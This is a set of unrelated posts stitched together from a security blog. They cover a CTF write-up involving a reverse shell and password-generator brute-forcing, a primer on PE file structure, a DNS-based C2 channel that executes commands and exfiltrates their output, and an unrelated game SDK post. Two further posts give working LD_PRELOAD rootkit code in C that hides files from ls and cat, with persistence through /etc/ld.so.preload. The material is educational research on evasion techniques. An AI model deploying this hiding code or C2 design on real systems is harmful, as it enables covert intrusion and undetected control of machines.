From further investigation over what can be exploted there I have landed on CVE-2022-24637. With that exploit I could run a successful reverse shell on the machine.\nUsing linpeas I found some useful information over the user steven\n/home/steven/passwordGenerator # Windows PE Exectuable /home/steven/.notes/screenshot.png # Screenshot of some program /home/steven/.notes/notes.pdf # Password protected PDF I suspected that the screenshot.png is am image of the passwordGenerator.On the other hand the passwordGenerator was unusually big and the whole use of that binary is to create \u0026lsquo;secure\u0026rsquo; passwords. I noticed the python icon on the binary and I suspected that this could be a packed python project with PyInstaller. I confirmed that when I loaded the whole thing in Ghidra/IDA.\nI have used pyinstxtractor to extract the *.pyc files, and then the uncomplyle6 to decompile the *.pyc files. Which has led me to the actual source code of the binary:\nThis is the function that generates the password:\ndef genPassword(self): length = value char = index if char == 0: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^\u0026amp;*()_-+={}[]|:;\u0026lt;\u0026gt;,.?\u0026#39; else: if char == 1: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39; else: if char == 2: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890\u0026#39; else: try: qsrand(QTime.currentTime().msec()) password = \u0026#39;\u0026#39; for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle(\u0026#39;Error\u0026#39;) msg.setText(\u0026#39;Error while generating password!, Send a message to the Author!\u0026#39;) x = msg.exec_() return password I edited the length to 32 (as I have it on the screenshot) and edited the script a bit more to create a list out of possible passwords. I can do that because the QTime.currentTime().msec() function returns the numbers from 1-1000 with that range I have a big chance of guessing the generated password.\nNote: This process can be a bit frustrating since it takes time to generate the passwords. I personally spent little over an hour.\nThen I used pdfcrack to crack the password of the PDF, there I found the password for the user ethan and I successfully logged in with it and I found the first flag.\nFlag 2 I ran linpeas.sh again, and I found the following SUID binary:\n... ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rwsr-x--- 1 root ethan 814936 Mar 15 2022 /usr/bin/pinns ...

I decided to take a deep look at how FLOSS is working and possibly recreate some of its functionality in my own tool.\nBefore reading further, I want you to know that this post is about research I did on static analysis. There is nothing new here - no new tools or features are being discovered. Everything that I talk about already exists in other tools. A big part of this research uses the OpenAI Chat GPT. I made sure to fact-check the information provided here, as the GPT can sometimes produce misleading output.\nMy research focuses on Windows Portable Executable (PE) files because they are the most common type. Therefore, we\u0026rsquo;ll start by exploring how these files operate.\nKeywords RVA (Relative Virtual Address) - the virtual address of an object from the file once it is loaded into memory, minus the base address of the file image. IDT (Import Directory Table) - is a data structure in a Portable Executable (PE) file that stores information about dynamic-link libraries (DLLs) that the file depends on and the functions that the file imports from those DLLs. ILT - is a data structure in a Portable Executable (PE) file that stores the addresses of imported functions in the executable or library. IAT (Import Address Table) - can be the same with ILT, however when a file is being loaded into memory the loader will overwrite the addresses of the IAT with their new memory address locations. DEP (Data Execution Prevention) - is a security feature that is designed to prevent code from being executed in certain areas of memory where it is not supposed to be executed. doc ASLR (Address Space Layout Randomization) - is a security feature that randomizes the memory locations of certain parts of a program or operating system, making it more difficult for attackers to predict or control where certain code or data is located in memory. wiki Windows Portable Executable (PE) An executable is a set of binary data that contains instructions for the operating system to execute when the program is loaded into memory. Let\u0026rsquo;s examine how we can manually parse a Portable Executable (PE) file by reading and interpreting the bytes it contains. To do this, we must carefully review the binary data in the PE file and try to make sense of it.\nThe term image refers to the contents of a file when it is loaded into memory. You will encounter this term frequently in the explanations below.\nDOS Header The first 64 bytes of a binary file represent the DOS header, which is included for backwards compatibility and does not directly affect the functioning of the Portable Executable (PE). These 64 bytes contain information such as the number of pages in the file, the number of relocations, the checksum, OEM identifiers, and reserved words. The last 4 bytes of the DOS header, e_lfanew, contain the offset or address of the new PE header in modern Windows applications.\nThe first two bytes of an executable file, 4D 5A which translates to MZ in ASCII, serve as an indicator that the file is an executable intended for use on a Windows operating system.\nWhy 4D 5A? DOS Stub / Rich Header Following the first 64 bytes is the DOS Stub, a small program that displays an error message on systems that are not compatible with MS-DOS. This is a legacy feature dating back to the early days of Windows, when the operating system was built on top of MS-DOS.\nThe Rich Header, on the other hand, is not a required or standard part of the Portable Executable (PE) file format. It contains metadata about the compiler or packer that was used to create the executable and may provide additional information about the file. The magic number for the Rich Header is 52 69 63 68, which translates to Rich in ASCII.\nThe Rich Header information is encrypted using the XOR cipher, which can be easily decrypted using the 4 bytes immediately following the Rich ASCII which is the key.\nTo decrypt the rest of the header, we must run the XOR decipher on the file and unmask the value 44 61 6E 53, which translates to \u0026ldquo;DanS\u0026rdquo; in ASCII. This marks the beginning of the Rich Header, which is then followed by 3 0s after deciphering.\nWith this information, we can determine the start and end of the Rich Header and parse it accordingly.\nThe header can contain data about:\nCompiler and build environment information Timestamps Checksums Other metadata The Rich Header is a very interesting topic that I would like to write more about, until then you can read the following articles.\nVB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format The devil’s in the Rich header NT Headers (New Technology) If we follow the offset indicated in the last two bytes of the DOS header, we will reach the new PE headers (also known as NT headers). These headers are identified by the 4-byte magic number 50 45 00 00, which translates to PE.. in ASCII. This magic number is used to distinguish the PE headers from other types of headers.\nThe structure of the _IMAGE_NT_HEADERS64:\ntypedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; The structure of _IMAGE_FILE_HEADER:\ntypedef struct _IMAGE_FILE_HEADER { WORD Machine; // Predefined value [IMAGE_FILE_MACHINE_I386 or IMAGE_FILE_MACHINE_AMD64] WORD NumberOfSections; DWORD TimeDateStamp; // Timestamp of which the executable was compiled or linked DWORD PointerToSymbolTable; // The offset to the COFF Symbol Table DWORD NumberOfSymbols; // The number of symbols in the COFF Header WORD SizeOfOptionalHeader; WORD Characteristics; // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; What is COFF?

The headers of the file are used to specify the characteristics of these sections, such as whether they contain executable code, initialized data, uninitialized data, or other types of information.\nTip: You can detect if a PE file has been packed by comparing the values of the VirtualSize and SizeOfRawData fields in the headers. If the VirtualSize is significantly larger than the SizeOfRawData, it is a strong indication that the file has been packed. However, it is worth noting that there may be some discrepancy between the two values due to section padding and alignment.\nSections Sections are where the actual data of the file is. There are Special Sections as well but we will focus only on the reserved sections such as:\n.bss - Uninitialized data (free format) .data - Initialized data (free format) .cormeta - CLR metadata that indicates that the object file contains managed code .debug (following with) $F - Generated FPO Frame Poiner Omission debug information (obsolete) $P - Precompiled debug types (object only) $S - Debug symbols (object only) $T - Debug types (object only) .drective - Linker Options .edata/.idata - Export/Import Tables .idlsym - Includes registered SEH (image only) to support IDL attributes. Often used in conjuction with FPO ref .pdata - Exception information .rdata - Read-only initialized data .reloc - Relocations of the Image .rsrc - Resource Directory .s(following with) - Global Pointer-relative .sbss - uninitialized data .sdata - initialized data .srdata - read-only data .sxdata - Registered exception handler data (free format and x86/object only) .vsdata - initialized data (free format and for ARM, SH4, and Thumb architectures only) .text - Executable code (free format) .tls/.tls$ - Thread-local storage (object only) .xdata - Exception information (free format) Refer to the documentation for further explanation. Each section is explained very well there.\nImport Directory Table (IDT) The Import Directory Table (IDT) stores information about dynamic-link libraries (DLLs) that a Portable Executable (PE) file depends on and the functions that the file imports from those DLLs. In most cases, this information is stored in the .idata section of the PE file, which is dedicated to this purpose. However, in some cases, the IDT may be stored elsewhere.\nThe address of the IDT can be found in the IMAGE_DATA_DIRECTORY array of the _IMAGE_OPTIONAL_HEADER structure. It is the second entry in the array. Each entry in the IDT is 8 bytes in size, with the first 4 bytes representing the address of the entry and the second 4 bytes representing the size. This information is used by the operating system\u0026rsquo;s dynamic linker to resolve the addresses of the imported functions and link them to the actual functions in the imported DLLs.\nLet\u0026rsquo;s take a look at an example:\nCC280000 The IDT is located at 0xCC28 A0000000 The size is 160 (A0) Following the address of the Import Directory we reach the first import located at 0xCC28, let\u0026rsquo;s see what is located at that address.\nEach Import is defined by 24 bytes, given these 24 bytes values:\nF8290000 OriginalFirstThunk 00000000 Timestamp 00000000 Forwarder Chain (Address) C02A0000 Name of the Import (RVA) D8210000 FirstThunk OriginalFirstThunk/FirstThunk To find out which functions are imported by a particular import in a Portable Executable (PE) file, we can follow the OriginalFirstThunk address at 0xF829, which leads us to the Import Lookup Table (ILT). The ILT is a sequence of bytes that represents the addresses of the imported functions, similar to an array or table.\nNote: It\u0026rsquo;s important to note that the Import Address Table (IAT) may be the same as the ILT. However, when a file is loaded, the loader will overwrite the addresses in the IAT with the new memory addresses of the imported functions.\nEach function address in the ILT is 8 bytes in length, so the resulting data should look something like this:\nFC2A0000 This is the address of the imported function 00000000 at 0xFC2A -\u0026gt; B001 Ordinal/Name Import Flag 5368656C6C4578656375746557 ASCII -\u0026gt; \u0026#39;ShellExecuteW\u0026#39; 00 Null char terminating the string With this we can denote and \u0026lsquo;parse\u0026rsquo; all the imports and respectively their imported functions.\nResources To locate the resources in a Portable Executable (PE) file, you can use the third entry in the IMAGE_DATA_DIRECTORY array of the IMAGE_OPTIONAL_HEADER structure. This entry contains the address and size of the resources section in the file.\n00000000 Characteristics 00000000 TimeDateStamp 0000 Major Version 0000 Minor Version 0000 Number of Named entities 0400 Number of ID entities And the corresponding struct\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; WORD NumberOfIdEntries; IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } Now let\u0026rsquo;s take a look at the entries IMAGE_RESOURCE_DIRECTORY_ENTRY\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union { struct { DWORD NameOffset:31; DWORD NameIsString:1; } DUMMYSTRUCTNAME; DWORD Name; WORD Id; } DUMMYUNIONNAME; union { DWORD OffsetToData; // Leads us to the resource directory struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; } DUMMYSTRUCTNAME2; } DUMMYUNIONNAME2; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; The user mmn3mm has written a pretty good explanation of how to parse this section here.\nException Directory The Exception Directory is a section in a Portable Executable (PE) file that contains information about the exception handling functions in the code. It includes the addresses of the exception handling functions, the types of exceptions they handle, and other relevant details.\nWhen an exception occurs, the operating system\u0026rsquo;s exception handling mechanism uses the Exception Directory to find the appropriate exception handling function. This section is optional and may not be present in every PE file, depending on whether the code in the file uses exception handling.\nIt is typically located at .pdata section, and the offset to the Exception section is the 4th entry in the IMAGE_DATA_DIRECTORY array.\nPersonal Note: As far as I understood that section (I could be wrong here) it contains exception handlers that are being used throughout the execution and they execute only if the execution is within the specified BeginAddress and EndAddress.\nThe entries there are 12 bytes, first 4 bytes contains the BeginAddress the next 4 bytes contain the EndAddress and the last 4 bytes contains the address (UnwindInfoAddress) for the Unwind Information Block which contains information of how to unwind the stack whenever an exception occurs.\nBase Relocations When a program is compiled, the compiler saves a value into the IMAGE_OPTIONAL_HEADER.ImageBase field, which specifies the desired memory location where the program is intended to be executed. However, this memory location is often already occupied by other programs, so the actual memory location used by the program may be different. In this case, the loader will recalculate the ImageBase value and write the new value into the program\u0026rsquo;s image. This will cause all addresses in the program that are offset by the ImageBase value (essentially, all addresses in the program) to be recalculated with the new ImageBase value and stored in the .reloc section of the image. This process is necessary to ensure that the program can run correctly at its actual memory location.\nThe user 0xRick has written a very good article of how to calcuate the entries within the Relocation Block and more.\nDebug Microsoft Documentation\nThe Debug section is the 7th entry of the IMAGE_DATA_DIRECTORY array, its structure looks like this:\ntypedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // Describing the debug info DWORD TimeDateStamp; WORD MajorVersion; // Version of the debugging tool WORD MinorVersion; // Version of the debugging tool DWORD Type; // Type of Debugging (this will denote the format that you need to parse) DWORD SizeOfData; // The size of the debug data (not including the debug directory itself) DWORD AddressOfRawData; // The address of the debug data when loaded, relative to the image base DWORD PointerToRawData; // The file pointer to the debug data. } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; Refer to the Microsoft\u0026rsquo;s Documentation about how to parse further debug information.\nLoad Config This section contains information about the dynamic linking and loading of the executable or library and it is the 11th entry of the IMAGE_DATA_DIRECTORY array. The Load Config section typically includes information such as the address of the entry point of the program, the size of the stack and heap, and the addresses of any imported functions or data.\nIt can also include security and integrity-related information, such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) settings.\nIt is typically located at .rdata section and it is an optional section for a PE file.\nThe structure follows:\ntypedef struct _IMAGE_LOAD_CONFIG_DIRECTORY { DWORD Size; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD GlobalFlagsClear; DWORD GlobalFlagsSet; DWORD CriticalSectionDefaultTimeout; DWORD DeCommitFreeBlockThreshold; DWORD DeCommitTotalFreeThreshold; PVOID LockPrefixTable; DWORD MaximumAllocationSize; DWORD VirtualMemoryThreshold; DWORD ProcessAffinityMask; DWORD ProcessHeapFlags; WORD CSDVersion; WORD DependentLoadFlags; PVOID EditList; PVOID SecurityCookie; PVOID SEHandlerTable; DWORD SEHandlerCount; PVOID GuardCFCheckFunctionPointer; PVOID GuardCFDispatchFunctionPointer; PVOID GuardCFFunctionTable; DWORD GuardCFFunctionCount; DWORD GuardFlags; } IMAGE_LOAD_CONFIG_DIRECTORY, *PIMAGE_LOAD_CONFIG_DIRECTORY; Access Rights of the Sections The section rights are presented in the DWORD Characteristics; field of the _IMAGE_SECTION_HEADER , you can check the valid values in the microsoft\u0026rsquo;s documentation.\nThose are the standard access rights of PE.\nSection Name Access Rights .text Read and Execute .rdata Read-Only .data Read and Write .bss Read and Write .rsrc Read Only .reloc Read Only Note: Seungwon Lee has indicated that if an essential element of an executable is the WRITE property of a section, the PE could be packed.\nConclusion This is the first part of my research on static analysis; the primary focus would be on Windows PEs and exactly how much information I can extract before going into the guessing territory.\nIn order for me to do that, I must know how do these files look like and what raw information is stored in their contents; that is why I started this research by examining Windows\u0026rsquo;s PE files.\nI hope you have reached that far and the information that I have provided is useful for you!\nReferences https://chat.openai.com/ https://github.com/mandiant/flare-floss https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings https://stackoverflow.com/questions/36550038/in-utf-16-utf-16be-utf-16le-is-the-endian-of-utf-16-the-computers-endianness https://0xrick.github.io/ https://securelist.com/the-devils-in-the-rich-header/84348/ https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://forensicitguy.github.io/rich-header-hashes-with-pefile/ https://github.com/mmn3mm/peresources The Study of Evasion of Packed PE from Static Detection (Mirza Baig, Pavol Zavarsky, Ron Ruhl, Dale Lindskog) Han, Seungwon Lee, Keungi Lee, Sangjin, “Packed PE File Detection for Malware Forensics”, Computer Science and its Applications, 2nd International Conference, http://ieeexplore.ieee.org/stamp/stamp.jsp?arn umber=05404211, 12 Dec 2009 ","permalink":"https://sy1.sh/posts/static-analysis-research-p1/","summary":"Overview Recently, I decided do delve a little bit more into static analysis, something beyond just running strings on a binary and getting the ASCII characters that are printable.

The A Record looks like this:\n{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME} I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.\nWhy DNS and not {arbitrary protocol}? DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.\nBypassing security products via DNS data exfiltration\nImplementation I will explain it briefly from the agent\u0026rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a TXT Record (containing a command such as ls) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.\nNote: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. More info\nAfter the server receives a request with the packet number and the total number of packets (that\u0026rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the {HEX_ENCODED_PAYLOAD} part of the message).\nCode / Demo Repository - The repository is created for a starting point to improve/build upon.\nThe repository contains both the agent and the server. When the server is being ran it sets the default handler dns.HandleFunc(\u0026quot;.\u0026quot;, AgentHandler) to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.\nUsage Start the server $ go run main.go 127.0.0.1:8053 Start the agent $ go run ./agent/main.go Execute commands on the server side shell (In the case below simple dir).

I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.\nOverview In the last post I\u0026rsquo;ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let\u0026rsquo;s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\u0026#34;/usr/bin/cat\u0026#34;, [\u0026#34;/usr/bin/cat\u0026#34;, \u0026#34;syl.lys\u0026#34;], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \u0026#34;syl.lys\u0026#34;, O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c. Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\n\u0026lt;journey\u0026gt;\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I\u0026rsquo;ve implemented didn\u0026rsquo;t work, or at least didn\u0026rsquo;t work all the time. I\u0026rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn\u0026rsquo;t quite get why it does what it does but I found the following discussions:\nintercepting the openat() system call for GNU tar How to find out what functions to intercept with LD_PRELOAD? As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I\u0026rsquo;ve decided to change my approach and override the open function instead.\n\u0026lt;/journey\u0026gt;\nHow does the open function work? I wouldn\u0026rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet\u0026rsquo;s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } In this code block I\u0026rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our \u0026ldquo;malicious\u0026rdquo; part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT) return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } Let\u0026rsquo;s see if its working\u0026hellip;\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); while((ret = original_readdir(dirp))) { if(strstr(ret-\u0026gt;d_name, MALICIOUS_FILE) == 0) break; } return ret; } Let\u0026rsquo;s test it out, supposedly we shouldn\u0026rsquo;t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html https://linux.die.net/man/2/openat And some kind StackOverflow users!

I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0 if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page. The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c\n#define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ","permalink":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments/","summary":"Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;.

Read more about it here.\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game. The game has an API which resides here, there are couple of endpoints that are useful for helpful statistics such as the player/* and games/* endpoints. I knew that I will be querying the API a lot for fetching info about players and games, so I\u0026rsquo;ve decided to create an SDK for that so I can ease my work a little bit. And after couple of weeks free time work I\u0026rsquo;ve created the LegionTD 2 SDK for Go.\nFunctionality Analyze games While my ultimate goal is to create set of analytics tools for Legion, I\u0026rsquo;ve created the most basic example of how that might happen using SQLite3 and Go.\nUnder the examples/analyze_games/ I\u0026rsquo;ve created an example that fetches about 3k games and put them into a SQLite database, after that you are able to analyze the data using SQL. I\u0026rsquo;ve created a simple query that gets the percentage of games that are being finished at waves 15, 13 and 10.\nIn my case here are the results, games finished at wave\nWave 15 Wave 13 Wave 10 20% 14% 4% Exporting the games You can derive that from the previous example but I\u0026rsquo;ve created a dedicated examples for both exporting to JSON and exporting to SQL.\nExport games to SQL Export games to JSON Fetching all of the Units Since that the game hasn\u0026rsquo;t got a dedicated route for fetching all the units I\u0026rsquo;ve created a simple example that resides in the repository under examples/get_all_units. The important thing here is that I\u0026rsquo;ve exported all the units into a single txt file and then I just spawn requests for each unit.\nConclusion I will be updating the SDK as I am progressing with the analytical tools and I will be adding new examples and adding new posts as I am doing it. For now you can keep an eye on the repository and I will be definitely posting/discussing more about it in the Discord Channel.\n","permalink":"https://sy1.sh/posts/legiontd2-sdk/","summary":"Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2, this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td).

